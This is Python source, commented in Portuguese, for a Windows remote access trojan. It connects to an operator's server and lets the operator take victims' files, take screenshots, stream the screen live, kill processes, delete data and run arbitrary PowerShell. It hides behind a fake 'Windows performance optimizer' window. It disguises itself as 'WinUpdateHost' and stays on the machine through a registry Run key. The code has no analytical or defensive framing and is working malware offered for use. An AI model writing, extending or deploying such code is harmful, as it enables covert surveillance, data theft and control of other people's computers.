import socket
import subprocess
import os
import sys
import ctypes
import time
import threading
import shutil
from datetime import datetime
from PIL import ImageGrab, Image
import mss
import psutil
from chave import enviar_msg, receber_msg, enviar_binario, receber_binario

# ===================== CONFIGURAÇÃO =====================
# TESTE LOCAL = 127.0.0.1
# NUVEM/EXTERNO = coloque IP/dominio do seu servidor
HOST = "127.0.0.1"
PORTA = 9001
# =========================================================

LOG = os.path.join(os.environ.get("TEMP", "."), "win_update.log")

def err(texto):
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {texto}\n")
    except Exception:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# ===================== FUNÇÕES AUXILIARES =====================
def _tamanho_arquivo(cam):
    try: return str(os.path.getsize(cam))
    except: return "0"

def cmd_listar_pasta(caminho):
    """Responde ao comando ls|caminho — formato que o painel entende"""
    try:
        caminho = os.path.abspath(caminho)
        if not os.path.isdir(caminho):
            return "ERRO: Pasta não existe"
        linhas = [f"DIR:{caminho}"]
        # Pastas primeiro
        for nome in os.listdir(caminho):
            full = os.path.join(caminho, nome)
            try:
                if os.path.isdir(full):
                    linhas.append(f"D|0|{nome}")
            except Exception:
                continue
        # Depois arquivos
        for nome in os.listdir(caminho):
            full = os.path.join(caminho, nome)
            try:
                if os.path.isfile(full):
                    linhas.append(f"F|{_tamanho_arquivo(full)}|{nome}")
            except Exception:
                continue
        return "\n".join(linhas)
    except Exception as e:
        return f"ERRO: {e}"

def cmd_download(caminho):
    """Envia um arquivo da vítima para o seu PC"""
    try:
        if not os.path.isfile(caminho):
            enviar_msg(s, "ERRO: Arquivo não encontrado")
            return
        nome = os.path.basename(caminho)
        with open(caminho, "rb") as f:
            dados = f.read()
        enviar_msg(s, f"ARQUIVO:{nome}")
        time.sleep(0.1)
        enviar_binario(s, dados)
    except Exception as e:
        enviar_msg(s, f"ERRO: {e}")

def cmd_upload(caminho_destino):
    """Recebe um arquivo do seu PC e salva na vítima"""
    try:
        dados = receber_binario(s, timeout=180)
        if dados is None:
            enviar_msg(s, "ERRO: recepção falhou")
            return
        os.makedirs(os.path.dirname(caminho_destino) or ".", exist_ok=True)
        with open(caminho_destino, "wb") as f:
            f.write(dados)
        enviar_msg(s, f"OK salvo: {caminho_destino} ({len(dados)} bytes)")
    except Exception as e:
        enviar_msg(s, f"ERRO: {e}")

def cmd_mkdir(caminho):
    try:
        os.makedirs(caminho, exist_ok=True)
        return f"OK: {caminho}"
    except Exception as e:
        return f"ERRO: {e}"

def cmd_del(caminho):
    try:
        if os.path.isdir(caminho):
            shutil.rmtree(caminho, ignore_errors=True)
            return f"OK pasta apagada: {caminho}"
        elif os.path.isfile(caminho):
            os.remove(caminho)
            return f"OK arquivo apagado: {caminho}"
        else:
            return "ERRO: não encontrado"
    except Exception as e:
        return f"ERRO: {e}"

def cmd_listar_processos():
    """Formato: PID|NOME|USUARIO|CPU|MEMORIA_KB"""
    linhas = []
    for p in psutil.process_iter(["pid","name","username","cpu_percent","memory_info"]):
        try:
            pid = p.info["pid"]
            nome = p.info["name"] or "?"
            user = p.info["username"] or "?"
            cpu = f"{p.info['cpu_percent']:.1f}" if p.info["cpu_percent"] is not None else "0.0"
            mem = str(int((p.info["memory_info"].rss / 1024))) if p.info["memory_info"] else "0"
            linhas.append(f"{pid}|{nome}|{user}|{cpu}|{mem}")
        except Exception:
            continue
    return "\n".join(linhas)

def cmd_kill(pid_str):
    try:
        pid = int(pid_str)
        psutil.Process(pid).terminate()
        time.sleep(0.5)
        if psutil.pid_exists(pid):
            psutil.Process(pid).kill()
        return f"OK PID {pid} finalizado"
    except Exception as e:
        return f"ERRO: {e}"

def cmd_info():
    import platform
    try:
        ip_externo = ""
        try:
            import urllib.request
            ip_externo = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        except Exception:
            ip_externo = "indisponível"
        linhas = [
            "=== INFORMAÇÕES DO SISTEMA ===",
            f"PC:         {platform.node()}",
            f"Sistema:    {platform.system()} {platform.release()} ({platform.version()})",
            f"Arquitetura:{platform.machine()}",
            f"Usuário:    {os.getenv('USERNAME')}",
            f"Admin:      {'SIM' if is_admin() else 'NAO'}",
            f"IP Local:   {socket.gethostbyname(socket.gethostname())}",
            f"IP Externo: {ip_externo}",
            f"Python:     {sys.version.split()[0]}",
            f"CPU Cores:  {os.cpu_count()}",
            f"Pasta Temp: {os.environ.get('TEMP')}",
        ]
        return "\n".join(linhas)
    except Exception as e:
        return f"ERRO: {e}"

def screen_png():
    im = ImageGrab.grab(all_screens=True)
    buf = io.BytesIO()
    im.save(buf, format="PNG", optimize=True)
    return buf.getvalue()

def live_jpg():
    with mss.mss() as sct:
        shot = sct.grab(sct.monitors[1])
        pil = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
        buf = io.BytesIO()
        pil.save(buf, format="JPEG", quality=45, optimize=True)
        return buf.getvalue()

def cmd_screenshot():
    try:
        enviar_msg(s, "SCREENSHOT_OK")
        time.sleep(0.1)
        enviar_binario(s, screen_png())
    except Exception as e:
        enviar_msg(s, f"ERRO screen: {e}")

def cmd_live():
    """Envia quadros JPG até receber PARAR_TELA"""
    parar = threading.Event()
    def _envia():
        while not parar.is_set():
            try:
                enviar_binario(s, live_jpg())
                time.sleep(0.12)
            except Exception:
                break
    th = threading.Thread(target=_envia, daemon=True)
    th.start()
    enviar_msg(s, "LIVE_OK")
    # Espera ordem de parar do painel
    receber_msg(s)
    parar.set()
    th.join(timeout=2)

def cmd_msgbox(texto):
    try:
        ctypes.windll.user32.MessageBoxW(0, texto, "Sistema", 0x40)
        return "OK exibida"
    except Exception as e:
        return f"ERRO: {e}"

def run_powershell(cmd):
    try:
        r = subprocess.run(
            ["powershell","-NoProfile","-ExecutionPolicy","Bypass","-Command",cmd],
            capture_output=True, text=True, timeout=90, creationflags=0x08000000
        )
        saida = (r.stdout or "") + (r.stderr or "")
        return saida if saida.strip() else "[comando executado — sem saída]"
    except subprocess.TimeoutExpired:
        return "[TEMPO ESGOTADO (90s)]"
    except Exception as e:
        # Fallback para CMD
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=45)
            return (r.stdout or "") + (r.stderr or "") + f"\n[PS falhou: {e}]"
        except Exception as e2:
            return f"[ERRO EXECUÇÃO: {e2}]"

# ===================== JANELA FALSA =====================
def janela_falsa():
    try:
        os.system("title OTIMIZADOR DE SISTEMA")
        os.system("color 0A")
        os.system("cls")
        print("\033[92m" + "="*54 + "\033[0m")
        print("       OTIMIZADOR DE DESEMPENHO WINDOWS")
        print("\033[92m" + "="*54 + "\033[0m")
        print("\nAplicando ajustes, aguarde...\n")
        for p in ["Arquivos temporários","Serviços desnecessários","Rede e latência","Registro do sistema"]:
            print(f"  > {p}...", end="", flush=True)
            time.sleep(0.9)
            print(" OK")
        print("\n\033[92m✅ TODOS OS AJUSTES APLICADOS\033[0m")
        input("\nPressione ENTER para fechar > ")
    except Exception as e:
        err(f"janela: {e}")

# ===================== PERSISTÊNCIA =====================
def persistencia():
    try:
        if not getattr(sys, "frozen", False):
            return  # só ativa se for .exe compilado
        eu = sys.executable
        destino = os.path.join(os.environ["APPDATA"], "WinUpdateHost.exe")
        if os.path.abspath(eu).lower() == os.path.abspath(destino).lower():
            return  # já está no lugar
        shutil.copy2(eu, destino)
        subprocess.run(
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdateHost /t REG_SZ /d "\\"{destino}\\" --oculto" /f',
            shell=True, capture_output=True
        )
    except Exception as e:
        err(f"persistencia: {e}")

# ===================== LOOP PRINCIPAL DE REDE =====================
s = None  # global para comandos que precisam enviar

def loop_rede():
    global s
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(12)
            s.connect((HOST, PORTA))
            s.settimeout(None)

            # Identificação que o painel mostra
            enviar_msg(s,
                f"ON|{os.getenv('COMPUTERNAME')}|{os.getenv('USERNAME')}|"
                f"Admin={is_admin()}|{socket.gethostbyname(socket.gethostname())}"
            )

            while True:
                cmd = receber_msg(s)
                if cmd is None:
                    break  # conexão caiu
                cmd = cmd.strip()
                if not cmd:
                    continue

                # ====== COMANDOS ESPECIAIS ======
                if cmd == "sair":
                    enviar_msg(s, "tchau")
                    try: s.close()
                    except: pass
                    return

                elif cmd == "screenshot":
                    cmd_screenshot()

                elif cmd == "live_start":
                    cmd_live()

                elif cmd == "ps":
                    enviar_msg(s, cmd_listar_processos())

                elif cmd == "info":
                    enviar_msg(s, cmd_info())

                elif cmd.startswith("ls|"):
                    enviar_msg(s, cmd_listar_pasta(cmd.split("|",1)[1]))

                elif cmd.startswith("download|"):
                    cmd_download(cmd.split("|",1)[1])

                elif cmd.startswith("upload|"):
                    cmd_upload(cmd.split("|",1)[1])

                elif cmd.startswith("mkdir|"):
                    enviar_msg(s, cmd_mkdir(cmd.split("|",1)[1]))

                elif cmd.startswith("del|"):
                    enviar_msg(s, cmd_del(cmd.split("|",1)[1]))

                elif cmd.startswith("kill|"):
                    enviar_msg(s, cmd_kill(cmd.split("|",1)[1]))

                elif cmd.startswith("msgbox|"):
                    enviar_msg(s, cmd_msgbox(cmd.split("|",1)[1]))

                # ====== QUALQUER OUTRA COISA = POWERSHELL ======
                else:
                    enviar_msg(s, run_powershell(cmd))

        except Exception as e:
            err(f"loop: {e}")
            time.sleep(8)
        finally:
            try:
                if s: s.close()
            except Exception:
                pass

# ===================== MAIN =====================
def main():
    try:
        # Eleva para admin se não for
        if not is_admin():
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable,
                    " ".join(f'"{a}"' for a in sys.argv), None, 1
                )
            except Exception:
                pass
            sys.exit(0)

        # Modo oculto: só roda a rede, sem janela
        if "--oculto" in sys.argv:
            loop_rede()
            sys.exit(0)

        # Instala persistência se for .exe
        persistencia()

        # Abre a conexão em processo OCULTO separado
        frozen = getattr(sys, "frozen", False)
        exe = sys.executable if frozen else sys.executable
        args = [exe]
        if not frozen:
            args.append(sys.argv[0])
        args.append("--oculto")
        try:
            subprocess.Popen(args, creationflags=0x08000000)
            time.sleep(1.2)
        except Exception as e:
            err(f"popen: {e}")
            # Fallback: roda em thread
            threading.Thread(target=loop_rede, daemon=True).start()

        # Mostra a janela falsa para o usuário
        janela_falsa()

    except Exception as e:
        err(f"main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()